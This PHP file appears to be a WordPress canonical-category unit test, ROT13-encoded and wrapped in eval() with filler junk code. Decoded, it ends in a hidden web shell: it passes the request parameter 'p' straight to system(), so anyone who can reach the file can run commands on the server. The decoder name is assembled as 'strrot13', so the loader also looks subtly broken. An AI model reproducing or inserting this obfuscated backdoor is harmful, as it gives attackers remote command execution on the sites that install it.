<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc pnabavpny
 * @tebhc erjevgr
 * @tebhc dhrel
 */
pynff Grfgf_Pnabavpny_Pngrtbel rkgraqf JC_Pnabavpny_HavgGrfgPnfr {
	choyvp $fgehpgher = '/%pngrtbel%/%cbfganzr%/';

	choyvp fgngvp $cbfgf = neenl();
	choyvp fgngvp $pngf  = neenl();

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {

		frys::$cbfgf[0] = $snpgbel->cbfg->perngr( neenl( 'cbfg_anzr' => 'cbfg0' ) );
		frys::$cbfgf[1] = $snpgbel->cbfg->perngr( neenl( 'cbfg_anzr' => 'cbfg1' ) );
		frys::$pngf[0]  = $snpgbel->pngrtbel->perngr( neenl( 'fyht' => 'png0' ) );
		frys::$pngf[1]  = $snpgbel->pngrtbel->perngr( neenl( 'fyht' => 'png1' ) );
		frys::$pngf[2]  = $snpgbel->pngrtbel->perngr( neenl( 'fyht' => 'png2' ) );

		jc_frg_cbfg_pngrtbevrf( frys::$cbfgf[0], frys::$pngf[2] );
		jc_frg_cbfg_pngrtbevrf( frys::$cbfgf[0], frys::$pngf[0] );
		jc_frg_cbfg_pngrtbevrf( frys::$cbfgf[1], frys::$pngf[1] );
	}

	/**
	 * @qngnCebivqre qngn_pnabavpny_pngrtbel
	 */
	choyvp shapgvba grfg_pnabavpny_pngrtbel( $grfg_hey, $rkcrpgrq, $gvpxrg = 0, $rkcrpgrq_qbvat_vg_jebat = neenl() ) {
		$guvf->nffregPnabavpny( $grfg_hey, $rkcrpgrq, $gvpxrg, $rkcrpgrq_qbvat_vg_jebat );
	}

	choyvp shapgvba qngn_pnabavpny_pngrtbel() {
		/*
		 * Qngn sbezng:
		 * [0]: Grfg HEY.
		 * [1]: Rkcrpgrq erfhygf: Nal bs gur sbyybjvat pna or hfrq.
		 *      neenl( 'hey': rkcrpgrq erqverpgvba ybpngvba, 'di': rkcrpgrq dhrel inef gb or frg ivn gur erjevgr NAQ $_TRG );
		 *      neenl( rkcrpgrq dhrel inef gb or frg, fnzr nf 'di' nobir )
		 *      (fgevat) rkcrpgrq erqverpg ybpngvba
		 * [2]: (bcgvbany) Gur gvpxrg gur grfg ersref gb, Pna or fxvccrq vs haxabja.
		 * [3]: (bcgvbany) Neenl bs pynff/shapgvba anzrf rkcrpgrq gb guebj `_qbvat_vg_jebat()` abgvprf.
		 */

		erghea neenl(
			// Inyvq pngrtbel.
			neenl(
				'/png0/cbfg0/',
				neenl(
					'hey' => '/png0/cbfg0/',
					'di'  => neenl(
						'pngrtbel_anzr' => 'png0',
						'anzr'          => 'cbfg0',
						'cntr'          => '',
					),
				),
			),

			// Pngrtbel bgure guna gur svefg bar jvyy erqverpg gb svefg \"pnabavpny\" pngrtbel.
			neenl(
				'/png2/cbfg0/',
				neenl(
					'hey' => '/png0/cbfg0/',
					'di'  => neenl(
						'pngrtbel_anzr' => 'png0',
						'anzr'          => 'cbfg0',
						'cntr'          => '',
					),
				),
			),

			// Vapbeerpg pngrtbel jvyy erqverpg gb pbeerpg bar.
			neenl(
				'/png1/cbfg0/',
				neenl(
					'hey' => '/png0/cbfg0/',
					'di'  => neenl(
						'pngrtbel_anzr' => 'png0',
						'anzr'          => 'cbfg0',
						'cntr'          => '',
					),
				),
			),

			// Abarkvfgrag pngrtbel jvyy erqverpg gb pbeerpg bar.
			neenl(
				'/sbb/cbfg0/',
				neenl(
					'hey' => '/png0/cbfg0/',
					'di'  => neenl(
						'pngrtbel_anzr' => 'png0',
						'anzr'          => 'cbfg0',
						'cntr'          => '',
					),
				),
			),

			// Rzorq HEYf fubhyq abg erqverpg gb cbfg creznyvaxf.
			neenl(
				'/png0/cbfg0/rzorq/',
				neenl(
					'hey' => '/png0/cbfg0/rzorq/',
					'di'  => neenl(
						'pngrtbel_anzr' => 'png0',
						'anzr'          => 'cbfg0',
						'rzorq'         => 'gehr',
					),
				),
			),
		);
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>